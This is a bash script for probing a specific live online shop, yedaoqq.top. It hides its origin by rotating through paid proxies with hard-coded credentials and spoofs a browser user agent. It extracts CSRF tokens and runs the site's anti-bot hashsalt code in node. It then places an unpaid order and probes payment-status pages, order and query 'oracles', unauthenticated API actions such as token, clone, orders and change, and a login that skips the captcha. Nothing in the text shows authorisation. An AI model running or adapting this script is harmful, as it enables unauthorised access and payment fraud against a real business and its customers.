#!/bin/bash
# yedaoqq.top deep2 — pay, query, login gate, oracles, cheap unpaid order
set -u
KEY=C413ED6D; PWD=344F550A6F8B
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'
BASE=https://yedaoqq.top/shop
CK=/tmp/yedao2.ck; OUT=/tmp/yedao2_out; LOG=/tmp/yedao2.log
rm -rf "$OUT"; mkdir -p "$OUT"; rm -f "$CK"
exec > >(tee "$LOG") 2>&1

refresh(){
  RESP=$(curl -s --max-time 10 "https://share.proxy.qg.net/get?key=${KEY}&num=1" || true)
  SERVER=$(python3 -c "import json,sys
try:
 d=json.loads(sys.argv[1]); print(d['data'][0]['server'] if d.get('code')=='SUCCESS' and d.get('data') else '')
except Exception: print('')" "$RESP")
  [[ -n "$SERVER" ]] && PROXY_URL="http://${KEY}:${PWD}@${SERVER}"
  echo "PROXY=$PROXY_URL"
}
c(){ curl -sk --connect-timeout 5 --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -e "$BASE/" -H 'X-Requested-With: XMLHttpRequest' "$@"; }

for i in 1 2 3 4 5 6 7 8; do
  refresh
  code=$(curl -sk --max-time 25 -x "$PROXY_URL" -c "$CK" -b "$CK" -A "$UA" -o "$OUT/home.html" -w "%{http_code}" "$BASE/")
  echo WARM=$code
  [[ "$code" == "200" ]] && break
done

echo "=== pay flags / siteinfo extras ==="
c -X POST "$BASE/ajax.php?act=getcount" | tee "$OUT/getcount.json"; echo
# pay types often in home or buy
python3 - <<'PY'
import re
h=open('/tmp/yedao2_out/home.html',encoding='utf-8',errors='ignore').read()
print('pay mentions', re.findall(r'alipay|wxpay|qqpay|usdt|paytype|gn_\w+', h, re.I)[:30])
print('csrf', bool(re.search(r'csrf_token\s*=\s*"([^"]+)"', h)))
PY

echo "=== cheapest in-stock tid ==="
c "$BASE/%61pi.php?act=goodslist" -o "$OUT/goods.json"
python3 - <<'PY'
import json
g=json.load(open('/tmp/yedao2_out/goods.json'))['data']
cands=[]
for x in g:
  try: p=float(x.get('price') or 0)
  except: continue
  stock=x.get('stock')
  try: stock=int(stock) if stock is not None else -1
  except: stock=-1
  if 0 < p < 100000 and stock!=0:
    cands.append((p, stock, x.get('tid'), x.get('name'), x.get('isfaka')))
cands.sort()
print('cands', len(cands))
for row in cands[:15]:
  print(row)
if cands:
  open('/tmp/yedao2_out/tid.txt','w').write(str(cands[0][2]))
  open('/tmp/yedao2_out/price.txt','w').write(str(cands[0][0]))
PY
TID=$(cat "$OUT/tid.txt")
echo TID=$TID

echo "=== buy page hashsalt ==="
c "$BASE/?mod=buy&tid=$TID" -o "$OUT/buy.html" -w "BUY=%{http_code}:%{size_download}\n"
python3 - <<'PY'
import re,subprocess
h=open('/tmp/yedao2_out/buy.html',encoding='utf-8',errors='ignore').read()
print('len', len(h))
csrf=re.search(r'var\s+csrf_token\s*=\s*"([^"]+)"',h)
hs=re.search(r'var\s+hashsalt\s*=\s*(.+?);',h,re.S)
print('csrf', bool(csrf), 'hs', bool(hs), 'hs_len', len(hs.group(1)) if hs else 0)
print('inputname', re.findall(r'inputname="([^"]+)"|inputsname="([^"]*)"', h)[:10])
print('isfaka', re.findall(r'isfaka="([^"]+)"', h))
print('price', re.findall(r'price="([^"]+)"', h)[:5])
if csrf: open('/tmp/yedao2_out/csrf.txt','w').write(csrf.group(1))
if hs:
  open('/tmp/yedao2_out/hs.js','w').write('console.log('+hs.group(1)+')\n')
  hsalt=subprocess.check_output(['node','/tmp/yedao2_out/hs.js'],text=True).strip().splitlines()[-1]
  print('HS', hsalt)
  open('/tmp/yedao2_out/hs.txt','w').write(hsalt)
PY
CSRF=$(cat "$OUT/csrf.txt"); HS=$(cat "$OUT/hs.txt")
INPUT=yedao$(date +%H%M%S)
echo "paying tid=$TID input=$INPUT"

r=$(c -e "$BASE/?mod=buy&tid=$TID" -X POST \
  --data-urlencode "tid=$TID" --data-urlencode "inputvalue=$INPUT" --data-urlencode "num=1" \
  --data-urlencode "hashsalt=$HS" --data-urlencode "csrf_token=$CSRF" \
  "$BASE/ajax.php?act=pay")
echo "PAY=>$r"
echo "$r" > "$OUT/pay.json"
TN=$(python3 -c "import json;print(json.load(open('/tmp/yedao2_out/pay.json')).get('trade_no') or '')")
echo TN=$TN
echo "$INPUT" > "$OUT/input.txt"
echo "$TN" > "$OUT/tn.txt"

echo "=== pay response flags ==="
python3 - <<'PY'
import json
j=json.load(open('/tmp/yedao2_out/pay.json'))
for k in sorted(j):
  if k!='paymsg': print(k, j[k])
print('paymsg', str(j.get('paymsg'))[:200])
PY

if [[ -n "$TN" ]]; then
  echo "=== post-order surfaces ==="
  for p in \
    "other/getshop.php?trade_no=$TN" \
    "other/usdt-trc20/status.php?trade_no=$TN" \
    "other/usdt/status.php?trade_no=$TN" \
    "other/submit.php?type=usdt&orderid=$TN" \
    "other/submit.php?type=qqpay&orderid=$TN" \
    "other/qqpay.php?trade_no=$TN" \
    "?mod=order&orderid=$TN"; do
    code=$(c -o "$OUT/pb" -w "%{http_code}:%{size_download}" "$BASE/$p")
    body=$(head -c 200 "$OUT/pb" | tr '\n' ' ')
    echo "P $p => $code $body"
  done

  # query variants
  CSRF=$(python3 -c "import re;h=open('/tmp/yedao2_out/home.html',encoding='utf-8',errors='ignore').read();m=re.search(r'csrf_token\s*=\s*\"([^\"]+)\"',h);print(m.group(1) if m else '')")
  for data in \
    "qq=$TN&type=1&csrf_token=$CSRF" \
    "qq=$INPUT&csrf_token=$CSRF" \
    "qq=$TN&type=1" \
    "qq=$INPUT"; do
    code=$(c -D "$OUT/q.hdr" -o "$OUT/q.body" -w "%{http_code}" -X POST -d "$data" "$BASE/ajax.php?act=query")
    echo "Q [$data] => HTTP$code $(head -c 250 "$OUT/q.body")"
  done

  # act=order wrong skey sanity
  r=$(c -X POST -d "id=6357&skey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&csrf_token=$CSRF" "$BASE/ajax.php?act=order")
  echo "ORDER_SANITY=>$r"
fi

echo "=== login captcha gate ==="
c "$BASE/user/login.php" -o "$OUT/login.html" -w "login=%{http_code}\n"
r=$(c -X POST -d "csrf_token=$CSRF" "$BASE/ajax.php?act=captcha")
echo "CAPTCHA=>$r"
echo "$r" > "$OUT/captcha.json"
r=$(c -X POST -d "user=testyedao&pass=Test123456&csrf_token=$CSRF" "$BASE/user/ajax.php?act=login")
echo "LOGIN_NOPROOF=>$r"

echo "=== more API oracles ==="
for p in \
  "%61pi.php?act=token&key=test" \
  "%61pi.php?act=clone&key=test" \
  "%61pi.php?act=orders&key=test&limit=1" \
  "%61pi.php?act=change&key=test&id=1&zt=1" \
  "%61pi.php?act=search&id=6357"; do
  r=$(c "$BASE/$p")
  echo "API $p => ${r:0:180}"
done

echo "=== invite/gift/card ==="
for act in invite_content invite_query gift_start card_check checklogin; do
  r=$(c -X POST -d "csrf_token=$CSRF&query_qq=123456&km=test" "$BASE/ajax.php?act=$act")
  echo "ACT $act => ${r:0:180}"
done

echo "===== P2 DONE ====="
ls -la "$OUT" | head
